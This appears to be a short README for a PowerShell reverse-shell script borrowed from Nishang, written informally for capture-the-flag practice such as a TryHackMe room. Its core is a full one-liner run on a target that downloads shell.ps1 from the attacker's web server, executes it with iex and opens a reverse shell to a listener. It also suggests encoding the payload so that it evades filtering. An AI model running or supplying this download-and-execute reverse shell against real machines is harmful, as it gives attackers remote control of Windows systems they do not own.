# powershell-reverse-shell
its a simple powershell script i have from nishanga a usefull for reverse shell most for windows


# how to run the powershell script and get a reverse shell(usage)
1. open a simple python server and make sure the script is right there were you have opened the server
command: python3 -m http.server 81

where: 
port 81 (is where i have decided to open the port coz for me port 80 was already in used)
ip_address: 10.8.58.50 (check via ifconfig command or ip a| grep tun0)

NB: After you have saved this script and opened a server now u can execute the following command on the target machine
2. there multiple ways to do this first all u need to save the file as saved for me as shell.ps1 and after u need to execute the following command the target machine(anyway vulnerable that can allow you to run command or execute commands

command: powershell -c iex (New-Object Net.WebClient).DownloadString('http://10.8.58.50:81/shell.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.8.58.50 -Port 1234

NB: sometimes this command may not work so u can just incode the command either online or anything i love doing this with burpsuite course it is easy
Forexample with a tryhackme  room(iron corp , in order to get a reverse shell you were supporsed to encode the payload more than two times
